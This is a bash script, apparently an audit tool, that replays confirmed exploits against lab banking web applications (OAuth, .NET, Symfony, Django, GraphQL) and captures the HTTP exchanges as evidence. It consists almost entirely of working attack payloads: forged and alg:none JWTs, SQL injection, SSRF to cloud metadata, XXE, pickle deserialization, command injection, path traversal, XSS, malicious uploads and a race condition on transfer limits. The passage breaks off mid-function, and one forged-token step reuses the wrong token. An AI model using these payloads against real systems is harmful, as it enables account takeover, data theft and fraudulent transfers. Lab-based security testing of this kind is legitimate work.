#!/bin/bash
# replay.sh — OUTIL UNIQUE pour rejouer les exploits confirmés et capturer les req/réponses
# réelles (evidence/APP-XX/captures/<VID>.http), intégrées par audit-report.py v2.
# Couvre les 10 applications (APP-07 SOAP inclus).
#
# Usage : bash replay.sh --all            # toutes les apps
#         bash replay.sh APP-02 APP-10    # apps ciblées
# Prérequis : lab allumé (apps concernées), capture.sh dans le même dossier.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"; CAP="$HERE/capture.sh"
PW='Password1!'; OTP='123456'
cap(){ bash "$CAP" "$@"; }                         # cap APP VID -- <curl args>
append(){ { echo; echo "===== $2 ====="; shift 2; curl -sk -i "$@"; } >> "$1" 2>/dev/null || true; }
B(){ echo "${AUDIT_BASE:-$HOME/banking-dast-fullscan}/evidence/$1/captures/$2.http"; }

# ---------------- APP-02 (OAuth / NestJS) ----------------
cap_app02(){ local A="https://app02.lab.zt3c-consulting.com"
  curl -sk -X POST "$A/admin/reset" -o /dev/null
  local TOK; TOK=$(curl -sk -X POST "$A/oauth/token" --data "grant_type=client_credentials&client_id=tpp-a&client_secret=$PW&scope=consents:write" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
  cap APP-02 APP02-V012 -- -X GET "$A/v1/accounts" -H "X-API-Key: AGK-LAB-tppa-0001"
  cap APP-02 APP02-V009 -- -X POST "$A/v1/consents" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"user":"alice","permissions":["accounts:read"],"callbackUrl":"http://127.0.0.1:5000/"}'
  cap APP-02 APP02-V010 -- -X POST "$A/oauth/token" --data "grant_type=client_credentials&client_id=tpp-a&client_secret=essai1"
  cap APP-02 APP02-V020 -- -X POST "$A/v1/consents" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"user":"=2+5+cmdlab","permissions":["accounts:read"]}'
  append "$(B APP-02 APP02-V020)" "PREUVE : export CSV (cellule non neutralisee)" -H "Authorization: Bearer $TOK" "$A/v1/reports/csv"
  # --- ajouts couverture ---
  local jq; jq(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)" 2>/dev/null; }
  # token scope restreint (pour V007) et token tpp-b + id de compte tpp-b (pour BOLA/IDOR)
  local TOKR TOKB IDA IDB
  TOKR=$(curl -sk -X POST "$A/oauth/token" --data "grant_type=client_credentials&client_id=tpp-a&client_secret=$PW&scope=accounts:read" | jq 'd.get("access_token","")')
  TOKB=$(curl -sk -X POST "$A/oauth/token" --data "grant_type=client_credentials&client_id=tpp-b&client_secret=$PW&scope=accounts:read" | jq 'd.get("access_token","")')
  IDA=$(curl -sk "$A/v1/accounts" -H "Authorization: Bearer $TOK"  | jq '(d.get("accounts") or d)[0].get("accountId") or (d.get("accounts") or d)[0].get("id")')
  IDB=$(curl -sk "$A/v1/accounts" -H "Authorization: Bearer $TOKB" | jq '(d.get("accounts") or d)[0].get("accountId") or (d.get("accounts") or d)[0].get("id")')
  cap APP-02 APP02-V001 -- "$A/v1/accounts/${IDB:-ACC-B-001}" -H "Authorization: Bearer $TOK"                       # BOLA : compte d'un autre TPP
  cap APP-02 APP02-V004 -- "$A/v1/accounts/${IDA:-ACC-A-001}" -H "Authorization: Bearer $TOK"                       # exposition excessive (IBAN/PAN)
  local EXID; EXID=$(curl -sk "$A/v1/exports" -H "Authorization: Bearer $TOK" | python3 -c 'import sys,json,re
try:
 d=json.load(sys.stdin); ids=[x.get("exportId","") for x in d.get("exports",[])]
 nums=[int(re.sub(r"\D","",i)) for i in ids if re.search(r"\d",i)]
 print("EXP-%d"%(min(nums)+1) if nums else "")
except Exception: print("")')
  cap APP-02 APP02-V011 -- "$A/v1/exports/${EXID:-EXP-1008}" -H "Authorization: Bearer $TOK"                        # IDOR export séquentiel (trou de séquence = autre TPP)
  cap APP-02 APP02-V002 -- -X POST "$A/v1/admin/consents" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"tpp":"tpp-a","action":"grant-all"}'  # BFLA admin
  cap APP-02 APP02-V003 -- -X POST "$A/v1/consents" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"user":"alice","permissions":["accounts:read","payments:write","admin"]}'  # mass-assign scope
  cap APP-02 APP02-V007 -- "$A/v1/payments" -H "Authorization: Bearer ${TOKR:-$TOK}"                                # scope non appliqué
  cap APP-02 APP02-V008 -- "$A/v1-internal/accounts"                                                                # endpoint interne déprécié
  cap APP-02 APP02-V013 -- "$A/v1/accounts" -H "Authorization: Bearer $TOK" -H "Origin: https://attaquant.evil"     # CORS reflété
  cap APP-02 APP02-V014 -- "$A/v1/accounts/@@invalide@@" -H "Authorization: Bearer $TOK"                            # erreurs verbeuses
  cap APP-02 APP02-V015 -- "$A/v1/health"                                                                           # en-têtes absents
  cap APP-02 APP02-V016 -- "$A/v1/health"                                                                           # bannière/version
  cap APP-02 APP02-V017 -- -i "$A/oauth/authorize?response_type=code&client_id=tpp-a&redirect_uri=https://attaquant.evil/cb"  # open redirect
  cap APP-02 APP02-V018 -- "$A/v1/notifications/preview?message=%3Cscript%3Ealert('v018')%3C/script%3E" -H "Authorization: Bearer $TOK"  # XSS réfléchi
  cap APP-02 APP02-V019 -- "$A/v1/reports/download?name=../../../../etc/passwd" -H "Authorization: Bearer $TOK"     # traversée de chemin
  cap APP-02 APP02-V021 -- -X POST "$A/v1/notifications/render" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"template":"lab-{{19*19}}-ssti"}'  # SSTI (361 attendu)
  # --- V022 : codes d'autorisation séquentiels/prévisibles ---
  cap APP-02 APP02-V022 -- -i "$A/oauth/authorize?response_type=code&client_id=tpp-a&redirect_uri=https://tpp-a.lab.exemple/cb&state=s1"  # 1er code AUTHCODE-N
  append "$(B APP-02 APP02-V022)" "PREUVE : 2e appel -> code incrémenté (AUTHCODE-N+1) = prévisible" -i "$A/oauth/authorize?response_type=code&client_id=tpp-a&redirect_uri=https://tpp-a.lab.exemple/cb&state=s2"
  # --- V006 (confusion RS256->HS256) et V005 (aud non vérifiée) : forge HS256 signée avec la clé publique JWKS (SPKI PEM) ---
  local FORGE; FORGE=$(curl -sk "$A/.well-known/jwks.json" | python3 -c '
import sys,json,base64,hmac,hashlib,time,textwrap
k=json.load(sys.stdin)["keys"][0]
def ub(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
n=int.from_bytes(ub(k["n"]),"big"); e=int.from_bytes(ub(k["e"]),"big")
def el(x):
 if x<0x80: return bytes([x])
 b=x.to_bytes((x.bit_length()+7)//8,"big"); return bytes([0x80|len(b)])+b
def tlv(t,v): return bytes([t])+el(len(v))+v
def ei(x):
 b=x.to_bytes((x.bit_length()+7)//8 or 1,"big")
 if b[0]&0x80: b=b"\x00"+b
 return tlv(2,b)
spki=tlv(0x30, tlv(0x30, tlv(6,bytes([42,134,72,134,247,13,1,1,1]))+tlv(5,b"")) + tlv(3,b"\x00"+tlv(0x30,ei(n)+ei(e))))
pem=("-----BEGIN PUBLIC KEY-----\n"+"\n".join(textwrap.wrap(base64.b64encode(spki).decode(),64))+"\n-----END PUBLIC KEY-----\n").encode()
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def tok(aud):
 now=int(time.time())
 h=b64u(json.dumps({"alg":"HS256","typ":"JWT","kid":"lab-1"},separators=(",",":")).encode())
 p=b64u(json.dumps({"sub":"tpp-a","client_id":"tpp-a","scope":"accounts:read","iat":now,"exp":now+3600,"aud":aud,"iss":"https://agrega-idp.lab.exemple"},separators=(",",":")).encode())
 s=b64u(hmac.new(pem,(h+"."+p).encode(),hashlib.sha256).digest())
 return h+"."+p+"."+s
print(tok("agrega-api")); print(tok("autre-service"))')
  local T006 T005; T006=$(printf "%s\n" "$FORGE" | sed -n 1p); T005=$(printf "%s\n" "$FORGE" | head -1)
  cap APP-02 APP02-V006 -- "$A/v1/accounts" -H "Authorization: Bearer $T006"   # confusion RS256->HS256 (aud correct)
  cap APP-02 APP02-V005 -- "$A/v1/accounts" -H "Authorization: Bearer $T005"   # aud=autre-service accepté (aud non vérifiée)
}

# ---------------- APP-03 (.NET / SQL Server) ----------------
cap_app03(){ local A="https://app03.lab.zt3c-consulting.com"
  curl -sk -X POST "$A/admin/reset" -o /dev/null
  local R ACC REF; R=$(curl -sk -X POST "$A/api/login" -H 'Content-Type: application/json' --data "{\"username\":\"saisie1\",\"password\":\"$PW\",\"otp\":\"$OTP\"}")
  ACC=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
  REF=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["refresh_token"])')
  cap APP-03 APP03-V012 -- -X POST "$A/api/login" -H 'Content-Type: application/json' --data "{\"username\":\"saisie1\",\"password\":\"$PW\",\"otp\":\"$OTP\"}"   # Set-Cookie SameSite=None sans Secure
  curl -sk -X POST "$A/api/logout" -H "Authorization: Bearer $ACC" -o /dev/null
  cap APP-03 APP03-V006 -- -X POST "$A/api/token/refresh" -H 'Content-Type: application/json' --data "{\"refresh_token\":\"$REF\"}"   # refresh apres logout
  cap APP-03 APP03-V008 -- -G "$A/api/reports" -H "Authorization: Bearer $ACC" --data-urlencode "sort=amount;WAITFOR DELAY '0:0:5'--"   # SQLi timing
  cap APP-03 APP03-V010 -- "$A/api/batches/9001/export" -H "Authorization: Bearer $ACC"   # exposition excessive
  cap APP-03 APP03-V022 -- -X POST "$A/api/reports/import" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data '{"url":"http://169.254.169.254/latest/meta-data/"}'   # SSRF
  cap APP-03 APP03-V009 -- -X POST "$A/api/transfers" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data '{"accountId":"A-001","amount":10,"label":"<img src=x onerror=document.title=1>","beneficiaryIban":"FR7630001007941234567890185"}'   # XSS stocke (payload stocke verbatim)
  # --- ajouts couverture ---
  bprop(){ curl -sk "$A/api/batches" -H "Authorization: Bearer $1" | python3 -c "import sys,json
try:
 d=json.load(sys.stdin); a=d['batches'] if isinstance(d,dict) and 'batches' in d else d
 a=a if isinstance(a,list) else []
 print($2)
except Exception: print('')"; }
  local BID ACCB BIDB
  # BID = un lot PENDING_APPROVAL (approuvable) ; sinon le 1er
  BID=$(bprop "$ACC" "next((str(x.get('id')) for x in a if x.get('status')=='PENDING_APPROVAL'), (str(a[0].get('id')) if a else ''))")
  ACCB=$(curl -sk -X POST "$A/api/login" -H 'Content-Type: application/json' --data "{\"username\":\"saisie2\",\"password\":\"$PW\",\"otp\":\"$OTP\"}" | python3 -c 'import sys,json
try: print(json.load(sys.stdin)["access_token"])
except: print("")')
  BIDB=$(bprop "${ACCB:-$ACC}" "str(a[0].get('id')) if a else ''")
  cap APP-03 APP03-V001 -- -X POST "$A/api/batches/${BID:-9002}/approve" -H "Authorization: Bearer $ACC"            # auto-approbation par le créateur
  cap APP-03 APP03-V002 -- -X POST "$A/api/batches/${BID:-9002}/validate" -H "Authorization: Bearer $ACC"          # BFLA : rôle saisie valide
  cap APP-03 APP03-V005 -- -X PUT "$A/api/batches/${BID:-9002}" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data '{"status":"APPROVED"}'  # mass-assign statut
  cap APP-03 APP03-V004 -- "$A/api/batches/${BIDB:-9101}" -H "Authorization: Bearer $ACC"                          # IDOR : lot entreprise B
  cap APP-03 APP03-V007 -- -X POST "$A/api/transfers" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data '{"accountId":"A-001","amount":-1000,"beneficiaryIban":"FR7630001007941234567890185"}'  # montant négatif
  cap APP-03 APP03-V011 -- -i "$A/signin-callback?returnUrl=https://attaquant.evil"                                # open redirect SSO
  cap APP-03 APP03-V013 -- "$A/api/batches/@@" -H "Authorization: Bearer $ACC"                                     # erreurs .NET verbeuses
  cap APP-03 APP03-V014 -- "$A/"                                                                                   # CSP / en-têtes absents
  cap APP-03 APP03-V015 -- --path-as-is "$A/swagger//v1/swagger.json"                                              # swagger prod (double slash)
  cap APP-03 APP03-V016 -- "$A/"                                                                                   # bannière/version
  cap APP-03 APP03-V017 -- "$A/api/partner/profile" -H "Authorization: Bearer $ACC" -H "Origin: https://attaquant.evil"  # CORS reflété
  cap APP-03 APP03-V018 -- -X POST "$A/api/password/forgot" -H 'Content-Type: application/json' --data '{"username":"saisie1"}'  # énumération (existant)
  append "$(B APP-03 APP03-V018)" "PREUVE : username INEXISTANT -> réponse distincte" -X POST "$A/api/password/forgot" -H 'Content-Type: application/json' --data '{"username":"nobody-zzz"}'
  cap APP-03 APP03-V019 -- "$A/confirm"                                                                            # clickjacking
  cap APP-03 APP03-V020 -- -X POST "$A/api/profile/preferences" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data '{"$type":"System.Collections.Generic.List`1[[System.Int32]], mscorlib","theme":"dark"}'  # désérialisation $type
  # V021 : JWT à signature invalide accepté sur endpoint legacy
  local BADJWT; BADJWT=$(python3 -c 'import base64,json;h=base64.urlsafe_b64encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode()).rstrip(b"=").decode();p=base64.urlsafe_b64encode(json.dumps({"sub":"saisie1","role":"admin"}).encode()).rstrip(b"=").decode();print(f"{h}.{p}.AAAAinvalidsignatureAAAA")')
  cap APP-03 APP03-V021 -- "$A/api/legacy/whoami" -H "Authorization: Bearer $BADJWT"                               # signature JWT non vérifiée (legacy)
  # --- V003 : race condition TOCTOU plafond quotidien (contrôle de cumul non atomique) ---
  curl -sk -X POST "$A/admin/reset" -o /dev/null   # repartir d'un cumul connu
  local TRB='{"accountId":"A-001","amount":400,"beneficiaryIban":"FR7630001007941234567890185"}'
  cap APP-03 APP03-V003 -- -X POST "$A/api/transfers" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data "$TRB"   # virement témoin (201)
  { echo; echo "===== PREUVE : 20 POST /api/transfers de 400 EN PARALLÈLE -> plusieurs 201 (cumul > plafond) ====="
    for i in $(seq 1 20); do curl -sk -o /dev/null -w "%{http_code}\n" -X POST "$A/api/transfers" -H "Authorization: Bearer $ACC" -H 'Content-Type: application/json' --data "$TRB" & done; wait
    echo "(chaque 201 = virement accepté ; >1 prouve que le contrôle de plafond n'est pas atomique)"
  } >> "$(B APP-03 APP03-V003)" 2>&1
}

# ---------------- APP-04 (PHP / Symfony) ----------------
cap_app04(){ local A="https://app04.lab.zt3c-consulting.com" J=/tmp/j4cap.txt
  curl -sk -X POST "$A/admin/reset" -o /dev/null; rm -f $J
  curl -sk -c $J "$A/login" -o /dev/null
  curl -sk -c $J -b $J -X POST "$A/login" --data "username=conseiller1&password=$PW&otp=$OTP" -o /dev/null
  local T; T=$(curl -sk -b $J "$A/profile" | grep -oE 'name="_token" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  cap APP-04 APP04-V018 -- -X POST "$A/notes/preview" -b $J -H 'Content-Type: application/json' --data '{"template":"<?= strtoupper(\"lab-ssti-app04\").\"|\".(21*2) ?>"}'   # SSTI
  cap APP-04 APP04-V019 -- -X POST "$A/profile/update" -b $J --data-urlencode "_token=$T" --data-urlencode "nom_complet=C1" --data-urlencode "email=c1@lab" --data-urlencode "phone=0" --data-urlencode "bio=x" --data-urlencode "role=DIRECTEUR"   # over-posting
  append "$(B APP-04 APP04-V019)" "PREUVE : /admin/users accessible apres elevation" -b $J "$A/admin/users"
  cap APP-04 APP04-V007 -- -X POST "$A/files/1001/close" -b $J --data-urlencode "_token=$T"   # bypass transition etat
  cap APP-04 APP04-V015 -- "$A/clients?search=Durand" -b $J -H "X-Forwarded-For: 203.0.113.207"   # XFF spoof (X-Client-Ip)
  cap APP-04 APP04-V021 -- "$A/files/1001/print" -b $J   # clickjacking (pas de X-Frame-Options)
  # --- ajouts couverture ---
  local CID CID2 UIDV
  CID=$(curl -sk -b $J "$A/clients" | grep -oE 'data-client-id="[0-9]+"' | head -1 | grep -oE '[0-9]+')
  CID2=$(curl -sk -b $J "$A/clients" | grep -oE 'data-client-id="[0-9]+"' | tail -1 | grep -oE '[0-9]+')   # un autre client (IDOR)
  UIDV=$(curl -sk -b $J "$A/admin/users" | grep -oE 'data-user-id="[0-9]+"' | head -1 | grep -oE '[0-9]+')
  # endpoint réel d'assignation de rôle : POST /admin/roles/{id}/assign (session élevée par V019 ci-dessus)
  local RID RTOK
  RID=$(curl -sk -b $J "$A/admin/users" | grep -oE 'action="/admin/roles/[0-9]+/assign"' | grep -oE '[0-9]+' | head -1)
  RTOK=$(curl -sk -b $J "$A/admin/users" | grep -oE 'name="_token" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  cap APP-04 APP04-V002 -- -b $J "$A/clients?search=x%27%20OR%20%271%27%3D%271"               # SQLi recherche client
  cap APP-04 APP04-V003 -- -b $J "$A/export?template=../../../../etc/passwd"                   # LFI / traversée
  cap APP-04 APP04-V008 -- -b $J "$A/export?full=1"                                            # export PII complet
  cap APP-04 APP04-V009 -- -b $J "$A/api/clients/${CID2:-2050}"                                # IDOR API clients (client d'un autre conseiller)
  cap APP-04 APP04-V004 -- -b $J "$A/clients/${CID2:-2050}/notes"                              # IDOR notes (client d'un autre conseiller)
  cap APP-04 APP04-V012 -- "$A/_profiler"                                                      # profiler Symfony
  cap APP-04 APP04-V013 -- "$A/app_dev.php"                                                    # front controller dev
  cap APP-04 APP04-V014 -- -X OPTIONS "$A/"                                                    # méthodes HTTP (Allow)
  cap APP-04 APP04-V016 -- "$A/"                                                               # bannière/version
  cap APP-04 APP04-V017 -- -b $J "$A/clients/report?q=%3Cscript%3Ealert('v017')%3C/script%3E"  # XSS réfléchi
  cap APP-04 APP04-V020 -- -b $J -H "Origin: https://attaquant.evil" "$A/api/profile"          # CORS reflété
  cap APP-04 APP04-V011 -- -i -c /tmp/j4b.txt -X POST "$A/login" --data "username=conseiller1&password=$PW&otp=$OTP"  # cookie sans HttpOnly
  cap APP-04 APP04-V001 -- -b $J -X POST "$A/admin/users/${RID:-41}/role" --data-urlencode "_token=$RTOK" --data-urlencode "role=DIRECTEUR"  # élévation de rôle
  cap APP-04 APP04-V006 -- -b $J -X POST "$A/admin/users/${RID:-41}/role" --data-urlencode "role=DIRECTEUR"  # CSRF (accepté sans _token)
  cap APP-04 APP04-V005 -- -b $J -X POST "$A/clients/${CID:-1500}/notes" --data-urlencode "_token=$T" --data-urlencode "body=<script>alert('v005')</script>"  # XSS stocké (note)
  cap APP-04 APP04-V010 -- -i -b "PHPSESSID=lab-fixation-0001" -c /tmp/j4fix.txt -X POST "$A/login" --data "username=conseiller1&password=$PW&otp=$OTP"  # fixation de session
  cap APP-04 APP04-V022 -- -X POST "$A/password/reset" --data-urlencode "username=conseiller1"  # énumération (existant)
  append "$(B APP-04 APP04-V022)" "PREUVE : username INEXISTANT -> réponse distincte" -X POST "$A/password/reset" --data-urlencode "username=nobody-zzz"
}

# ---------------- APP-05 (Django) ----------------
cap_app05(){ local A="https://app05.lab.zt3c-consulting.com" Je=/tmp/j5e.txt Ja=/tmp/j5a.txt
  curl -sk -X POST "$A/admin/reset" -o /dev/null
  dj(){ local U="$1" J="$2"; rm -f "$J"; local tok; tok=$(curl -sk -c "$J" "$A/login" | grep -oE 'name="csrfmiddlewaretoken" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
    curl -sk -c "$J" -b "$J" -X POST "$A/login" -H "Referer: $A/login" --data-urlencode "csrfmiddlewaretoken=$tok" --data-urlencode "username=$U" --data-urlencode "password=$PW" -o /dev/null; }
  dj emprunteur1 "$Je"; local CS; CS=$(grep csrftoken "$Je" | awk '{print $NF}')
  printf '#!/usr/bin/env python3\nprint("LAB-APP05-V001-EXEC")\n' > /tmp/evil.py
  cap APP-05 APP05-V001 -- -X POST "$A/applications/1001/documents" -b "$Je" -H "X-CSRFToken: $CS" -H "Referer: $A/applications/1001" -F 'file=@/tmp/evil.py;type=text/x-python'
  append "$(B APP-05 APP05-V001)" "PREUVE : fichier .py servi tel quel" -b "$Je" "$A/media/documents/1001/evil.py"
  printf '\x89PNG\r\n\x1a\nLAB-APP05-V015<?php echo 1;?>' > /tmp/poly.php
  cap APP-05 APP05-V015 -- -X POST "$A/applications/1001/documents" -b "$Je" -H "X-CSRFToken: $CS" -H "Referer: $A/applications/1001" -F 'file=@/tmp/poly.php;type=image/png'
  cap APP-05 APP05-V010 -- -X POST "$A/applications/1001/submit" -b "$Je"   # CSRF-exempt (pas de token)
  cap APP-05 APP05-V022 -- "$A/applications/1001/print" -b "$Je"            # clickjacking
  # XXE via /import (analyste1)
  dj analyste1 "$Ja"
  cat > /tmp/xxe.xml <<'X'
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root><name>&xxe;</name><amount>1</amount></root>
X
  local CSa; CSa=$(grep csrftoken "$Ja" | awk '{print $NF}')
  cap APP-05 APP05-V002 -- -X POST "$A/import" -b "$Ja" -H "X-CSRFToken: $CSa" -H "Referer: $A/import" -F 'file=@/tmp/xxe.xml;type=text/xml'
  # pickle RCE (preuve temporelle : on capture la requete sleep6)
  local P6; P6=$(python3 -c 'import pickle,base64,time
class E:
    def __reduce__(self): return (time.sleep,(6,))
print(base64.b64encode(pickle.dumps(E())).decode())')
  cap APP-05 APP05-V005 -- -X POST "$A/import/session" -b "$Ja" -H "X-CSRFToken: $CSa" -H "Referer: $A/import" --data-urlencode "data=$P6"
  # --- ajouts couverture (emprunteur1=Je/CS ; analyste1=Ja/CSa) ---
  cap APP-05 APP05-V008 -- -b "$Je" "$A/applications?status=x%27%20OR%20%271%27%3D%271"        # SQLi filtre
  cap APP-05 APP05-V011 -- -b "$Je" "$A/applications/err"                                       # DEBUG=True
  # V012 open redirect : connexion avec next -> 302 vers le domaine externe
  local jd5=/tmp/j5or.txt nt5; nt5=$(curl -sk -c $jd5 "$A/login?next=https://attaquant.evil" | grep -oE 'name="csrfmiddlewaretoken" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  cap APP-05 APP05-V012 -- -i -c $jd5 -b $jd5 -X POST "$A/login?next=https://attaquant.evil" -H "Referer: $A/login" --data-urlencode "csrfmiddlewaretoken=$nt5" --data-urlencode "username=emprunteur1" --data-urlencode "password=$PW" --data-urlencode "next=https://attaquant.evil"
  cap APP-05 APP05-V013 -- "$A/"                                                                # HSTS absent
  cap APP-05 APP05-V014 -- "$A/static/app.js"                                                   # nosniff absent
  cap APP-05 APP05-V016 -- "$A/"                                                                # bannière/version
  cap APP-05 APP05-V018 -- -b "$Je" "$A/applications/search?q=%3Cscript%3Ealert('v018')%3C/script%3E"  # XSS réfléchi
  cap APP-05 APP05-V021 -- -b "$Je" -H "Origin: https://attaquant.evil" "$A/api/profile"        # CORS reflété
  cap APP-05 APP05-V003 -- -X POST "$A/documents/fetch" -b "$Je" -H "X-CSRFToken: $CS" -H "Referer: $A/applications/1001" --data-urlencode "url=http://169.254.169.254/latest/meta-data/"  # SSRF
  cap APP-05 APP05-V007 -- -X POST "$A/applications/1001/amount" -b "$Je" -H "X-CSRFToken: $CS" -H "Referer: $A/applications/1001" --data-urlencode "amount=999999"  # modif montant après accord
  cap APP-05 APP05-V019 -- -X POST "$A/profile/update" -b "$Je" -H "X-CSRFToken: $CS" -H "Referer: $A/profile" --data-urlencode "role=admin"  # mass-assign
  cap APP-05 APP05-V023 -- -X POST "$A/notes/preview" -b "$Je" -H "X-CSRFToken: $CS" -H "Referer: $A/notes" --data-urlencode "template={{19*19}}"  # SSTI (361)
  cap APP-05 APP05-V009 -- -X POST "$A/applications/1001/comment" -b "$Ja" -H "X-CSRFToken: $CSa" -H "Referer: $A/applications/1001" --data-urlencode "text=<script>alert('v009')</script>"  # XSS stocké (analyste)
  local T5; T5=$(curl -sk -c /tmp/j5c.txt "$A/login" | grep -oE 'name="csrfmiddlewaretoken" value="[^"]+"' | head -1 | sed -E 's/.*value="([^"]+)".*/\1/')
  cap APP-05 APP05-V017 -- -i -c /tmp/j5c.txt -b /tmp/j5c.txt -X POST "$A/login" -H "Referer: $A/login" --data-urlencode "csrfmiddlewaretoken=$T5" --data-urlencode "username=emprunteur1" --data-urlencode "password=$PW"  # cookie sessionid sans Secure/SameSite
  cap APP-05 APP05-V020 -- -X POST "$A/password/reset" --data-urlencode "username=emprunteur1"  # énumération (existant)
  append "$(B APP-05 APP05-V020)" "PREUVE : username INEXISTANT -> réponse distincte" -X POST "$A/password/reset" --data-urlencode "username=nobody-zzz"
  dj emprunteur2 /tmp/j5b.txt; local DID2; DID2=$(curl -sk -b /tmp/j5b.txt "$A/applications" | grep -oE 'documents/[0-9]+' | head -1 | cut -d/ -f2)
  cap APP-05 APP05-V006 -- -b "$Je" "$A/documents/${DID2:-2001}"                                 # IDOR justificatif (doc emprunteur2)
}

# ---------------- APP-06 (GraphQL) ----------------
cap_app06(){ local A="https://app06.lab.zt3c-consulting.com"
  curl -sk -X POST "$A/admin/reset" -o /dev/null
  local TOK; TOK=$(curl -sk -X POST "$A/graphql" -H 'Content-Type: application/json' --data "{\"query\":\"mutation{login(username:\\\"mobile-alice\\\",password:\\\"$PW\\\",otp:\\\"$OTP\\\"){token}}\"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["login"]["token"])')
  cap APP-06 APP06-V006 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"query":"mutation{updateProfile(input:{displayName:\"Alice\",role:\"ADMIN\"}){id role}}"}'
  cap APP-06 APP06-V011 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"query":"{node(id:\"@@@\"){id}}"}'
  cap APP-06 APP06-V012 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"query":"{me{id role}}"}'
  cap APP-06 APP06-V004 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"query":"{me{accounts{owner{accounts{owner{accounts{owner{id}}}}}}}}"}'
  # --- ajouts couverture ---
  gql(){ cap APP-06 "$1" -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data "$2"; }
  cap APP-06 APP06-V003 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data '{"query":"{__schema{types{name}}}"}'  # introspection
  gql APP06-V005 '{"query":"mutation{blockAllCards}"}'                                            # BFLA mutation admin
  gql APP06-V008 '{"query":"mutation{a:verifyOtp(code:\"0000\"){ok} b:verifyOtp(code:\"0001\"){ok} c:verifyOtp(code:\"0002\"){ok}}"}'  # brute OTP via alias
  gql APP06-V010 '{"query":"{transactions(filter:\"1 OR 1=1\"){id}}"}'                            # SQLi filtre
  gql APP06-V015 '{"query":"mutation{setAvatar(url:\"http://169.254.169.254/latest/meta-data/\")}"}'  # SSRF
  gql APP06-V019 '{"query":"mutation{diagnosticPing(host:\"127.0.0.1; id\")}"}'                   # injection commande OS
  gql APP06-V021 '{"query":"mutation{transfer(amount:-1000,toAccount:\"ACC-2\"){id amount}}"}'    # virement négatif
  gql APP06-V002 '{"query":"{card(id:\"CARD-1001\"){pan cvv}}"}'                                  # PAN/CVV exposés
  cap APP-06 APP06-V007 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H "X-Device-Id: forged-device-999" -H 'Content-Type: application/json' --data '{"query":"{me{id}}"}'  # empreinte appareil non liée au token
  cap APP-06 APP06-V013 -- -X POST "$A/graphql" -H "Authorization: Bearer $TOK" -H "Origin: https://attaquant.evil" -H 'Content-Type: application/json' --data '{"query":"{me{id}}"}'  # CORS permissif
  cap APP-06 APP06-V014 -- "$A/healthz"                                                           # en-têtes absents
  cap APP-06 APP06-V016 -- "$A/healthz"                                                           # bannière/version
  cap APP-06 APP06-V020 -- -i "$A/go?next=https://attaquant.evil"                                 # open redirect
  cap APP-06 APP06-V022 -- -X POST "$A/graphql" -H 'Content-Type: application/json' --data '{"query":"{userDirectory{username email}}"}'  # auth manquante (annuaire sans Bearer)
  gql APP06-V017 '{"query":"mutation{requestPasswordReset(username:\"mobile-alice\")}"}'          # énumération (existant)
  append "$(B APP-06 APP06-V017)" "PREUVE : username INEXISTANT -> réponse distincte" -X POST "$A/graphql" -H 'Content-Type: application/json' --data '{"query":"mutation{requestPasswordReset(username:\"nobody-zzz\")}"}'
  # V018 JWT alg:none
  local NJWT; NJWT=$(python3 -c 'import base64,json
def b(o):return base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"sub":"mobile-admin","role":"ADMIN"})+".")')
  cap APP-06 APP06-V018 -- -X POST "$A/graphql" -H "Authorization: Bearer $NJWT" -H 'Content-Type: application/json' --data '{"query":"{me{id role}}"}'  # JWT alg:none accepté
  # S3 : token mobile-bruno + ids victimes
  local TOKB BID6
  TOKB=$(curl -sk -X POST "$A/graphql" -H 'Content-Type: application/json' --data "{\"query\":\"mutation{login(username:\\\"mobile-bruno\\\",password:\\\"$PW\\\",otp:\\\"$OTP\\\"){token}}\"}" | python3 -c 'import sys,json
try: print(json.load(sys.stdin)["data"]["login"]["token"])
except: print("")')
  BID6=$(curl -sk -X POST "$A/graphql" -H "Authorization: Bearer $TOKB" -H 'Content-Type: application/json' --data '{"query":"{me{accounts{id}}}"}' | python3 -c 'import sys,json
try: print(json.load(sys.stdin)["data"]["me"]["accounts"][0]["id"])
except: print("")')
